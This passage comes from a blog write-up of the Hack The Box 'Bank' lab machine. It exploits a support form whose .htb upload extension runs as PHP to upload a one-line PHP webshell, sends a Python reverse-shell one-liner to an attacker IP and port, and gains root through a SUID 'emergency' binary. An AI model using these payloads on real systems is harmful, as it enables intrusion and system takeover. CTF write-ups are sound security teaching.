		                    <span class="nt">&lt;tr&gt;&lt;td&gt;</span>1<span class="nt">&lt;/td&gt;&lt;td&gt;</span>teste<span class="nt">&lt;/td&gt;&lt;td&gt;</span>teste<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'http://bank.htb/uploads/shell.htb'</span><span class="nt">&gt;</span>Click Here<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'delete-ticket.php?id=1'</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;</span>2<span class="nt">&lt;/td&gt;&lt;td&gt;</span>nullarmor<span class="nt">&lt;/td&gt;&lt;td&gt;</span>nullarmor<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'http://bank.htb/uploads/shell.htb'</span><span class="nt">&gt;</span>Click Here<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'delete-ticket.php?id=2'</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;</span>3<span class="nt">&lt;/td&gt;&lt;td&gt;</span>DNknxCUj<span class="nt">&lt;/td&gt;&lt;td&gt;</span>DNknxCUj<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'http://bank.htb/uploads/DNknxCUj.htb'</span><span class="nt">&gt;</span>Click Here<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'delete-ticket.php?id=3'</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;</span>4<span class="nt">&lt;/td&gt;&lt;td&gt;</span>TTGKlVrn<span class="nt">&lt;/td&gt;&lt;td&gt;</span>TTGKlVrn<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'http://bank.htb/uploads/TTGKlVrn.htb'</span><span class="nt">&gt;</span>Click Here<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'delete-ticket.php?id=4'</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;</span>5<span class="nt">&lt;/td&gt;&lt;td&gt;</span>DSTyvaYt<span class="nt">&lt;/td&gt;&lt;td&gt;</span>DSTyvaYt<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'http://bank.htb/uploads/DSTyvaYt.htb'</span><span class="nt">&gt;</span>Click Here<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'delete-ticket.php?id=5'</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;</span>6<span class="nt">&lt;/td&gt;&lt;td&gt;</span>QGqPotVz<span class="nt">&lt;/td&gt;&lt;td&gt;</span>QGqPotVz<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'http://bank.htb/uploads/QGqPotVz.htb'</span><span class="nt">&gt;</span>Click Here<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">'delete-ticket.php?id=6'</span><span class="nt">&gt;</span>Delete<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;</span>		                <span class="nt">&lt;/tbody&gt;</span>
		            <span class="nt">&lt;/table&gt;</span>
		        <span class="nt">&lt;/div&gt;</span>
		    <span class="nt">&lt;/div&gt;</span>
		<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="c">&lt;!-- New Ticket --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-5"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"panel"</span><span class="nt">&gt;</span>

        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-body"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"new_ticket"</span> <span class="na">id=</span><span class="s">"new_ticket"</span> <span class="na">accept-charset=</span><span class="s">"UTF-8"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>

                <span class="nt">&lt;label&gt;</span>Title<span class="nt">&lt;/label&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">required</span> <span class="na">placeholder=</span><span class="s">"Title"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">id=</span><span class="s">"ticket_title"</span> <span class="na">style=</span><span class="s">"background-repeat: repeat; background-image: none; background-position: 0% 0%;"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;br&gt;</span>

                <span class="nt">&lt;label&gt;</span>Message<span class="nt">&lt;/label&gt;</span>
                <span class="nt">&lt;textarea</span> <span class="na">required</span> <span class="na">placeholder=</span><span class="s">"Tell us your problem"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">style=</span><span class="s">"height: 170px; background-repeat: repeat; background-image: none; background-position: 0% 0%;"</span> <span class="na">name=</span><span class="s">"message"</span> <span class="na">id=</span><span class="s">"ticket_message"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
                <span class="nt">&lt;br&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"position:relative;"</span><span class="nt">&gt;</span>
                		<span class="c">&lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&gt;</span>
				        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">'btn btn-primary'</span> <span class="na">href=</span><span class="s">'javascript:;'</span><span class="nt">&gt;</span>
				            Choose File...
				            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">required</span> <span class="na">style=</span><span class="s">'position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;'</span> <span class="na">name=</span><span class="s">"fileToUpload"</span> <span class="na">size=</span><span class="s">"40"</span>  <span class="na">onchange=</span><span class="s">'$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'</span><span class="nt">&gt;</span>
				        <span class="nt">&lt;/a&gt;</span>
				        <span class="ni">&amp;nbsp;</span>
				        <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">'label label-info'</span> <span class="na">id=</span><span class="s">"upload-file-info"</span><span class="nt">&gt;&lt;/span&gt;</span>
				<span class="nt">&lt;/div&gt;</span>
				<span class="nt">&lt;br&gt;</span>
                <span class="nt">&lt;button</span> <span class="na">name=</span><span class="s">"submitadd"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary mt20"</span> <span class="na">data-disable-with=</span><span class="s">"&lt;div class=&amp;quot;loading-o&amp;quot; style=&amp;quot;padding: 7px 21px;&amp;quot;&gt;&lt;/div&gt;"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
            <span class="nt">&lt;/form&gt;</span>

        <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;/section&gt;</span>

<span class="nt">&lt;/div&gt;</span>

        <span class="nt">&lt;/div&gt;</span>
        <span class="c">&lt;!-- /#page-wrapper --&gt;</span>

    <span class="nt">&lt;/div&gt;</span>
    <span class="c">&lt;!-- /#wrapper --&gt;</span>

    <span class="c">&lt;!-- jQuery --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/jquery.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

    <span class="c">&lt;!-- Bootstrap Core JavaScript --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

    <span class="c">&lt;!-- Morris Charts JavaScript --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/plugins/morris/raphael.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/plugins/morris/morris.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/plugins/morris/morris-data.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

    <span class="c">&lt;!-- SweetAlert --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/sweetalert.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>This page is a web form that has a file upload button, there’s a big chance of this upload form accept <code class="highlighter-rouge">.php</code> files to be uploaded, resulting in a malicious web shell upload!</p>

<p>To test this, we need to download the <code class="highlighter-rouge">http://bank.htb/support.php</code> HTML content and <code class="highlighter-rouge">change the form action</code> to send our uploaded file directly to the original upload entrypoint:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"new_ticket"</span> <span class="na">id=</span><span class="s">"new_ticket"</span> <span class="na">accept-charset=</span><span class="s">"UTF-8"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">action=</span><span class="s">"http://bank.htb/support.php"</span><span class="nt">&gt;</span></code></pre></figure>

<p>Actually, there’s a HTML comment line that says:</p>

<blockquote>
  <p>[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]</p>
</blockquote>

<p>All we need to do is create a malicious PHP webshell and save it as <code class="highlighter-rouge">.htb</code> to be executed as .php by the server:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="cp">?&gt;</span></code></pre></figure>

<p><a href="/assets/hackthebox/bank/bank-03-8d0132252de1f9a24c1f638801ff438c47aaf160a220a259f0bb571b1e2d7a60.png">
  <img src="/assets/hackthebox/bank/bank-03-8d0132252de1f9a24c1f638801ff438c47aaf160a220a259f0bb571b1e2d7a60.png" alt="Bank Exploit" class="zooming" data-rjs="/assets/hackthebox/bank/bank-03-8d0132252de1f9a24c1f638801ff438c47aaf160a220a259f0bb571b1e2d7a60.png" data-zooming-width="1274" data-zooming-height="505" />
</a></p>

<p>After uploading the file, we can see that our PHP webshell is working fine!</p>

<p><a href="/assets/hackthebox/bank/bank-04-d68a41450f9a503447ba318d8bb5e2d5ee7e02aa7694abe271b25df3da6ef8c4.png">
  <img src="/assets/hackthebox/bank/bank-04-d68a41450f9a503447ba318d8bb5e2d5ee7e02aa7694abe271b25df3da6ef8c4.png" alt="Bank Exploit" class="zooming" data-rjs="/assets/hackthebox/bank/bank-04-d68a41450f9a503447ba318d8bb5e2d5ee7e02aa7694abe271b25df3da6ef8c4.png" data-zooming-width="946" data-zooming-height="152" />
</a></p>

<p>Now we can send a reverse shell stager through the webshell and establish a reverse shell connection that will be sent to our netcat on listening mode:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.34",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>

<p><a href="/assets/hackthebox/bank/bank-05-cb338c26d3fdd5cfffd33bf31f9ebd98c5cd12ddfea5cf92b4ebe743821b1959.png">
  <img src="/assets/hackthebox/bank/bank-05-cb338c26d3fdd5cfffd33bf31f9ebd98c5cd12ddfea5cf92b4ebe743821b1959.png" alt="Bank Exploit" class="zooming" data-rjs="/assets/hackthebox/bank/bank-05-cb338c26d3fdd5cfffd33bf31f9ebd98c5cd12ddfea5cf92b4ebe743821b1959.png" data-zooming-width="1169" data-zooming-height="176" />
</a></p>

<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>

<p>For knowledge purposes I made a custom exploit that uploads a PHP webshell as unauthenticated user, send the reverse shell stager and spawn an interactive shell to us, it’s available on my GitHub :)</p>

<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/bank" target="_blank">Bank Exploit</a></p>

<p><a href="/assets/hackthebox/bank/bank-06-0c2756c21b930e8544231201237ebc7bb272743922a586544699ac8c7854e452.png">
  <img src="/assets/hackthebox/bank/bank-06-0c2756c21b930e8544231201237ebc7bb272743922a586544699ac8c7854e452.png" alt="Bank Exploit" class="zooming" data-rjs="/assets/hackthebox/bank/bank-06-0c2756c21b930e8544231201237ebc7bb272743922a586544699ac8c7854e452.png" data-zooming-width="651" data-zooming-height="230" />
</a></p>

<h1 id="post-exploitation---exploiting-suid-files">Post Exploitation - Exploiting SUID files</h1>

<p>After a basic system enumeration using LinEnum.sh, we found an interesting and unusual binary:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="o">[</span>-] SUID files:
<span class="nt">-rwsr-xr-x</span> 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
<span class="nt">-rwsr-xr-x</span> 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
<span class="nt">-rwsr-xr-x</span> 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
<span class="nt">-rwsr-xr--</span> 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
<span class="nt">-rwsr-xr-x</span> 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
<span class="nt">-rwsr-sr-x</span> 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
<span class="nt">-rwsr-xr-x</span> 1 root root 35916 May 17  2017 /usr/bin/chsh
<span class="nt">-rwsr-xr-x</span> 1 root root 45420 May 17  2017 /usr/bin/passwd
<span class="nt">-rwsr-xr-x</span> 1 root root 44620 May 17  2017 /usr/bin/chfn
<span class="nt">-rwsr-xr-x</span> 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
<span class="nt">-rwsr-xr-x</span> 1 root root 30984 May 17  2017 /usr/bin/newgrp
<span class="nt">-rwsr-xr-x</span> 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
<span class="nt">-rwsr-xr-x</span> 1 root root 66284 May 17  2017 /usr/bin/gpasswd
<span class="nt">-rwsr-xr-x</span> 1 root root 156708 May 29  2017 /usr/bin/sudo
<span class="nt">-rwsr-xr-x</span> 1 root root 72860 Oct 21  2013 /usr/bin/mtr
<span class="nt">-rwsr-sr-x</span> 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
<span class="nt">-rwsr-xr--</span> 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
<span class="nt">-rwsr-xr-x</span> 1 root root 38932 May  8  2014 /bin/ping
<span class="nt">-rwsr-xr-x</span> 1 root root 43316 May  8  2014 /bin/ping6
<span class="nt">-rwsr-xr-x</span> 1 root root 35300 May 17  2017 /bin/su
<span class="nt">-rwsr-xr-x</span> 1 root root 30112 May 15  2015 /bin/fusermount
<span class="nt">-rwsr-xr-x</span> 1 root root 88752 Nov 24  2016 /bin/mount
<span class="nt">-rwsr-xr-x</span> 1 root root 67704 Nov 24  2016 /bin/umount</code></pre></figure>

<p>The <code class="highlighter-rouge">/var/htb/bin/emergency</code> has no secrets, we just need to execute it and a new shell will be spawned with superuser privileges!</p>

<p><a href="/assets/hackthebox/bank/bank-07-05f1e2a2babe45f4609b2d72dd04c211542ceb968cada658353b5d2dd349e41b.png">
  <img src="/assets/hackthebox/bank/bank-07-05f1e2a2babe45f4609b2d72dd04c211542ceb968cada658353b5d2dd349e41b.png" alt="Bank Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bank/bank-07-05f1e2a2babe45f4609b2d72dd04c211542ceb968cada658353b5d2dd349e41b.png" data-zooming-width="541" data-zooming-height="96" />
</a></p>

          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=Bank+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/bank%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/bank" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
            </a>
          </div>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
            <noscript>Please enable JavaScript to view the comments.</noscript>
          
        </article>
        <footer class="footer scrollappear">
  <p>
    This site uses Chalk theme made by Nielsen Ramon.
  </p>
</footer>

      </div>
    </div>
  </main>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-159304176-1');
  </script>


<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>


  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>



  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>


<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>


  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>

</body>
</html>
